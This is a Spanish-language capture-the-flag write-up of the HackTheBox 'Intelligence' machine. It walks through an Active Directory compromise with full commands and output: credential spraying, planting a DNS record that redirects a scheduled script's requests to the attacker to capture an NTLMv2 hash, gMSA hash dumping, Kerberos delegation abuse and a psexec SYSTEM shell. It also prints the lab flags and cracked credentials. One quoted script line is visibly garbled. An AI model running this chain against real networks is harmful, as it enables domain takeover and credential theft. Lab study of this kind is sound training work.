# Intelligence - Lab Report

Máquina objetivo de dificultad media. Enfoque: enumeración de Active Directory, extracción de credenciales desde documentos públicos, y explotación mediante credential spraying.

## Información del Objetivo

| Propiedad | Valor |
|-----------|-------|
| Plataforma | HackTheBox |
| Dificultad | Media |
| IP Destino | 10.129.95.154 |
| Dominio | intelligence.htb |
| Hostname | dc.intelligence.htb |
| Sistema Operativo | Windows Server 2019 (Domain Controller) |
| Servicios Principales | Active Directory, Kerberos, LDAP, SMB, HTTP |

---

## Paso 1: Reconocimiento de Puertos

Objetivo: Identificar servicios disponibles en el objetivo para determinar vectores de ataque.

### 1.1 Escaneo Completo de Puertos

Se realiza un escaneo sin restricción de rango para identificar todos los puertos abiertos.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.154 -oG allPorts
```

Hallazgo: 18 puertos abiertos identificados, indicativo de un Domain Controller con servicios HTTP habilitados.

### 1.2 Escaneo de Versiones y Servicios

Se ejecuta un escaneo específico en los puertos encontrados para determinar versiones exactas de servicios.

```bash
nmap -sV -sC -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49667,49691,49692,49710,49713 10.129.95.154 -oN target
```

### 1.3 Puertos Identificados

| Puerto | Protocolo | Servicio | Versión | Proposito |
|--------|-----------|----------|---------|-----------|
| 53 | TCP | DNS | Simple DNS Plus | Resolución de nombres de dominio |
| 80 | TCP | HTTP | Microsoft IIS 10.0 | Servidor web para documentos |
| 88 | TCP | Kerberos | Microsoft Windows | Autenticación Kerberos para AD |
| 135 | TCP | MSRPC | Microsoft Windows | Acceso remoto a procedimientos |
| 139 | TCP | NetBIOS | Microsoft Windows | Comunicaciones de red |
| 389 | TCP | LDAP | Microsoft Windows AD | Consultas a directorio activo |
| 445 | TCP | SMB | Microsoft Windows | Compartición de recursos |
| 464 | TCP | Kpasswd | Microsoft Windows | Cambio de contraseña Kerberos |
| 593 | TCP | HTTP-RPC | Microsoft Windows | RPC sobre HTTP |
| 636 | TCP | LDAPS | Microsoft Windows AD | LDAP seguro (SSL) |
| 3268 | TCP | Global Catalog | Microsoft Windows AD | Catálogo global LDAP |
| 3269 | TCP | Global Catalog SSL | Microsoft Windows AD | Catálogo global LDAP seguro |
| 9389 | TCP | ADWS | .NET Message Framing | Servicios web de AD |
| 49667-49713 | TCP | Dynamic RPC | Microsoft Windows | RPC dinámico para servicios |

Información de certificado SSL/TLS detectada:
- Subject: CN=dc.intelligence.htb
- SAN: DNS:dc.intelligence.htb
- Validación: 2021-04-19 a 2022-04-19 (CERTIFICADO EXPIRADO)
- Clock Skew del sistema: ~8 horas de diferencia

---

## Paso 2: Enumeración de Servicios con Acceso Anónimo

Objetivo: Determinar qué servicios permiten acceso sin credenciales válidas.

### 2.1 Prueba de Acceso SMB Anónimo

Se intenta conectar a SMB sin proporcionar credenciales.

```bash
crackmapexec smb 10.129.95.154 -u "" -p ""
```

Resultado:
```
SMB    10.129.95.154   445    DC        [*] Windows 10 / Server 2019 Build 17763 x64
                                       (name:DC) (domain:intelligence.htb)
                                       (signing:True) (SMBv1:False)
SMB    10.129.95.154   445    DC        [+] intelligence.htb\
```

Interpretación: El acceso anónimo es permitido por el servidor, pero no se tienen permisos para enumerar comparticiones.

### 2.2 Enumeración de Comparticiones SMB

Intento de listar recursos compartidos disponibles.

```bash
crackmapexec smb 10.129.95.154 -u "" -p "" --shares
```

Resultado:
```
SMB    10.129.95.154   445    DC        [*] Windows 10 / Server 2019 Build 17763 x64
SMB    10.129.95.154   445    DC        [+] intelligence.htb\
SMB    10.129.95.154   445    DC        [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Interpretación: Sin credenciales válidas, no se pueden enumerar comparticiones de red.

### 2.3 Enumeración RPC Anónima

Se intenta enumerar información del dominio mediante Remote Procedure Call.

```bash
rpcclient -U "" -N intelligence.htb
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
```

Interpretación: La enumeración RPC también está restringida sin autenticación válida.

Conclusión: El acceso anónimo es limitado. Se requiere encontrar credenciales válidas para progresar.

---

## Paso 3: Enumeración de Servicios Web

Objetivo: Explorar el servidor HTTP para encontrar información sensible o credenciales expuestas.

### 3.1 Reconocimiento del Servidor Web

Se accede al servidor HTTP para identificar contenido accesible.

URL identificada: `http://intelligence.htb/documents/`

Descubrimiento: Un directorio de documentos contiene archivos PDF públicamente accesibles.

### 3.2 Extracción de Datos desde PDFs

Se encuentran dos archivos PDF que contienen información relevante.

Preparación: Instalación de PyPDF2 versión específica para extracción de texto.

```bash
pip install PyPDF2==1.26.0
```

Ejecución del script de extracción:

```bash
python enum_script.py
```

**Archivo: 2020-06-04-upload.pdf**

```
Título: NewAccountGuide

Contenido:
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

Interpretación: Se encontró una guía de nuevas cuentas con contraseña por defecto explícitamente documentada.

**Archivo: 2020-12-30-upload.pdf**

```
Título: InternalITUpdate

Contenido:
There has recently been some outages on our web servers.
Ted has got a script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.
```

Interpretación: Mención de usuario "Ted" y procedimientos de auditoría de seguridad.

Credenciales Extraídas:
- Contraseña por defecto: `NewIntelligenceCorpUser9876`
- Esta contraseña se aplica a todas las nuevas cuentas del dominio

---

## Paso 4: Enumeración de Usuarios del Dominio

Objetivo: Compilar una lista de usuarios válidos del dominio para intentos de autenticación.

### 4.1 Extracción de Nombres de Usuario desde PDFs

A partir de los PDFs procesados, se extrae una lista de nombres de usuario (30 usuarios totales).

### 4.2 Validación de Usuarios con Kerbrute

Se utiliza Kerbrute para validar qué usuarios existen realmente en el dominio Kerberos.

```bash
kerbrute userenum --dc 10.129.95.154 -d intelligence.htb users
```

Resultado: Todos los 30 usuarios extraídos son válidos en el dominio Active Directory.

---

## Paso 5: Explotación mediante Credential Spraying

Objetivo: Utilizar la contraseña por defecto encontrada contra todos los usuarios válidos identificados.

### 5.1 Prueba de Contraseña por Defecto

Se ejecuta un ataque de credential spraying utilizando CrackMapExec.

```bash
crackmapexec smb 10.129.95.154 -u users -p NewIntelligenceCorpUser9876 --continue-on-success
```

Resultado:
- Contraseña válida para: `Tiffany.Molina`
- Todos los demás usuarios retornaron STATUS_LOGON_FAILURE

Interpretación: Aunque la mayoría de usuarios cambió su contraseña por defecto, Tiffany Molina no lo hizo, permitiendo acceso exitoso al dominio.

Credencial Válida Encontrada: `Tiffany.Molina:NewIntelligenceCorpUser9876`

---

## Paso 6: Recopilación de Información del Dominio

Objetivo: Mapear la estructura de Active Directory para identificar caminos de escalación de privilegios.

### 6.1 Obtención de Flag de Usuario

Con credenciales válidas, se accede al sistema y se obtiene la flag de usuario:

```
d5493334ee8cba865b65e50154abf736
```

### 6.2 Enumeración de Active Directory con BloodHound

Se utiliza BloodHound para extraer información completa de relaciones y permisos del dominio.

```bash
bloodhound-python -c ALL -u Tiffany.Molina -p NewIntelligenceCorpUser9876 \
  -d intelligence.htb -dc intelligence.htb -ns 10.129.95.154
```

Información del Dominio Extraída:
- Dominios: 1 (intelligence.htb)
- Equipos: 1 (dc.intelligence.htb)
- Usuarios: 43
- Grupos: 55

---

## Paso 7: Búsqueda de Información Sensible en Recursos Compartidos

Objetivo: Explorar repositorios de archivos compartidos para identificar scripts o credenciales de servicios.

### 7.1 Enumeración de Comparticiones Disponibles

Con la credencial de Tiffany.Molina, se accede al compartimiento IT:

```bash
smbclient //10.129.95.154/IT -U 'Tiffany.Molina%NewIntelligenceCorpUser9876'
```

Contenido: Se descubre un script PowerShell `downdetector.ps1` (1046 bytes).

### 7.2 Análisis del Script Descubierto

Contenido del Script:
```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" 
  | Where-Object Name -like "web*") {
  try {
    $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
    if(.StatusCode -ne 200) {
      Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' 
        -To 'Ted Graves <Ted.Graves@intelligence.htb>' 
        -Subject "Host: $($record.Name) is down"
    }
  } catch {}
}
```

Interpretación: El script se ejecuta cada 5 minutos y utiliza credenciales por defecto de Windows para ejecutar solicitudes web. El usuario Ted.Graves ejecuta este script con `UseDefaultCredentials`.

---

## Paso 8: Ataque de Captura de Credenciales mediante DNS Poisoning

Objetivo: Capturar las credenciales de Ted.Graves cuando ejecute el script que realiza solicitudes HTTP.

### 8.1 Inyección de Registro DNS Malicioso

Se utiliza el acceso de Tiffany.Molina para crear un registro DNS falso.

```bash
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' \
  -r websant -a add -t A -d 10.10.14.163 10.129.95.154
```

Resultado: Se inyecta un registro DNS que redirige solicitudes hacia la IP del atacante (10.10.14.163).

### 8.2 Captura de Credenciales con Responder

Se inicia Responder para capturar hashes NTLMv2:

```bash
sudo responder -I tun0
```

Captura exitosa de credentials de Ted.Graves.

### 8.3 Crack del Hash NTLMv2 Capturado

Se utiliza John the Ripper para descifrar el hash:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Resultado: `Ted.Graves:Mr.Teddy`

### 8.4 Validación de Credencial

Se verifica que la credencial funciona:

```bash
crackmapexec smb 10.129.95.154 -u Ted.Graves -p Mr.Teddy --shares
```

Resultado: Ted.Graves tiene permisos de lectura en múltiples compartimientos (IT, NETLOGON, SYSVOL, Users).

---

## Paso 9: Escalación de Privilegios mediante Delegación de Servicio

Objetivo: Obtener acceso de administrador mediante explotación de delegación de servicio Kerberos (S4U2Proxy).

### 9.1 Extracción de Credenciales de Cuenta de Servicio

Ted.Graves pertenece a un grupo que puede leer credenciales de cuentas de servicio gestionadas.

```bash
python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
```

Resultado: Se obtiene el hash NTLM de la cuenta de servicio `svc_int$`.

### 9.2 Sincronización de Reloj del Sistema

Prerequisito crítico para ataques Kerberos:

```bash
sudo ntpdate 10.129.95.154
sudo hwclock -w
```

### 9.3 Explotación de S4U2Self y S4U2Proxy

Se utiliza la cuenta de servicio para impersonar al usuario Administrator:

```bash
getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator \
  intelligence.htb/svc_int -hashes :d5538dca5ba2ff329c9df39ef130f439
```

Resultado: Se consigue un ticket válido para Administrator.

### 9.4 Obtención de Shell Administrativo

Se configura la variable de entorno Kerberos y se ejecuta PsExec:

```bash
export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
impacket-psexec -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
```

Resultado: Se obtiene acceso con privilegios SYSTEM en el Domain Controller.

### 9.5 Obtención de Flag de Administrador

```bash
C:\Users\Administrator\Desktop> type root.txt
5deddeb0f2a7cf5d499c0ed5bdb588fb
```

---

## Análisis Final

| Fase | Técnica | Hallazgo |
|------|---------|----------|
| Reconocimiento | Enumeración de puertos | 18 servicios identificados |
| Enumeración | PDF extraction | Contraseña por defecto encontrada |
| Enumeración | Kerbrute | 30 usuarios válidos |
| Explotación | Credential spraying | Usuario Tiffany.Molina comprometido |
| Escalación | DNS poisoning + Responder | Ted.Graves capturado |
| Escalación | S4U2Self/S4U2Proxy | Administrator impersonado |
| Resultado | PsExec Kerberos | Dominio comprometido |

---